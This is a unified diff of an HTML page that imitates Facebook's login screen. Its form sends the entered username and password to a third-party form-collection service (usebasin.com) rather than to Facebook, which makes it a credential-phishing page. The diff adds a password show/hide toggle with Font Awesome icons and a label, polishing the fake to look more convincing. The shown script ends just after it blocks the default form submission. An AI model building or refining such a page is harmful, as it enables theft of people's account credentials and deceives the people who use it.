@@ -4,8 +4,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook Login</title>
-    <meta name="description" content="Login to Facebook to start sharing and connecting with your friends, family and people you know.">
+    <meta name="description" content="Login to Facebook to start sharing and connecting with your friends, family, and people you know.">
     <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/b/b9/2023_Facebook_icon.svg" type="image/svg+xml">
+    <!-- Include Font Awesome for the eye icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -54,6 +56,21 @@
             border: 1px solid #ccc;
             border-radius: 5px;
             font-size: 16px;
+        }
+        .password-container {
+            position: relative;
+            width: 100%;
+        }
+        .password-container input {
+            padding-right: 30px;
+        }
+        .eye-icon {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            font-size: 18px;
         }
         .login-btn {
             width: 100%;
@@ -140,8 +157,14 @@
         </div>
         <div class="container">
             <form id="loginForm" action="https://usebasin.com/f/0f599a21a091" method="POST">
+                <label for="userInput">Login to Facebook</label>
                 <input type="text" id="userInput" name="userInput" class="input-field" placeholder="Email, phone number, or username" required>
-                <input type="password" name="password" class="input-field" placeholder="Password" required>
+                <div class="password-container">
+                    <input type="password" id="password" name="password" class="input-field" placeholder="Password" required>
+                    <span class="eye-icon" id="togglePassword">
+                        <i class="fas fa-eye"></i>
+                    </span>
+                </div>
                 <button type="submit" class="login-btn">Log In</button>
             </form>
             <a href="#" class="forgot-password">Forgot password?</a>
@@ -171,6 +194,18 @@
     </div>
 
     <script>
+        // Toggle password visibility
+        const togglePassword = document.getElementById("togglePassword");
+        const passwordField = document.getElementById("password");
+
+        togglePassword.addEventListener("click", function() {
+            // Toggle the password visibility
+            const type = passwordField.type === "password" ? "text" : "password";
+            passwordField.type = type;
+            // Toggle the eye icon
+            togglePassword.innerHTML = type === "password" ? '<i class="fas fa-eye"></i>' : '<i class="fas fa-eye-slash"></i>';
+        });
+
         document.getElementById("loginForm").addEventListener("submit", function(event) {
             event.preventDefault(); // Prevent the default form submission
 
